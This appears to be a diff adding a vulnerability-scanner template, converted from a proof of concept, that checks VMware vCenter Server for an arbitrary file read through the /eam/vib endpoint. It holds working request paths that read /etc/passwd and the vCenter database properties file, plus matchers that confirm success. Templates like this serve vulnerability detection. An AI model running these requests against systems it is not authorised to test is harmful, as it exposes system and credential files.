@@ -1,0 +1,35 @@
+id: yaml-poc-vmware-vcenter_server-readfile-CT-158124
+info:
+  name: Yaml Poc Vmware Vcenter_Server Readfile Ct 158124
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-vmware-vcenter_server-readfile-CT-158124'
+  tags: vmware,lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /eam/vib?id=/etc/passwd
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:[x*]:0:0:'
+- method: GET
+  path:
+  - /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - org.postgresql.Driver
